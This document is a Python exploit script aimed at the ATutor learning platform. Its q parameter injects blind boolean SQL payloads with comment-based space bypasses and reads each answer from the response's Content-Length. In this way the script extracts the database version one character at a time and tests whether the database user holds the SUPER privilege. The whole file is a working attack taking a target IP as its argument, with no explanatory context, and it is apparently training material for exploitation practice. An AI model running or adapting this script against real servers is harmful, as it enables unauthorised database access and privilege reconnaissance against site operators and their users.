import requests
import sys

def searchFriends_sqli(ip):
    print("(+) Retrieving database version length....")

    for i in range(100):
        target = "http://{}/ATutor/mods/_standard/social/index_public.php?q=AAAA')/**/OR/**/(SELECT/**/LENGTH(VERSION()))={}%23".format(ip, i)
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])

        if content_length > 20:
            version_length = i
            print(version_length)

    print("(+) Retrieving database version....")

    for i in range(1, version_length + 1):
        injection_string = "AAAA')/**/OR/**/(ASCII(SUBSTRING((SELECT/**/VERSION()),{},1)))=[REPLACEMENT]%23".format(i)
        for j in range(32, 127):
            target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, injection_string.replace("[REPLACEMENT]", str(j)))
            r = requests.get(target)
            content_length = int(r.headers['Content-Length'])
            
            if content_length > 20:
                extracted_char = chr(j)
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
            
    print()

    print("(+) Checking if the database user has SUPER privilege...")
    target = "http://{}/ATutor/mods/_standard/social/index_public.php?q=AAAA')/**/OR/**/(SELECT/**/Super_priv/**/FROM/**/mysql.user/**/WHERE/**/user/**/=/**/(SELECT/**/SUBSTRING_INDEX((SELECT/**/CURRENT_USER()),'@',1))/**/AND/**/Host/**/=/**/(SELECT/**/SUBSTRING_INDEX((SELECT/**/CURRENT_USER()),'@',-1)))='Y';%23".format(ip, i)
    r = requests.get(target)
    content_length = int(r.headers['Content-Length'])

    if content_length > 20:
        print("Yes")
    else:
        print("No")

def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target>" % sys.argv[0])
        print("(+) eg: %s 192.168.121.103" % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]
    searchFriends_sqli(ip)
    print("(+) done!")

if __name__ == "__main__":
    main()
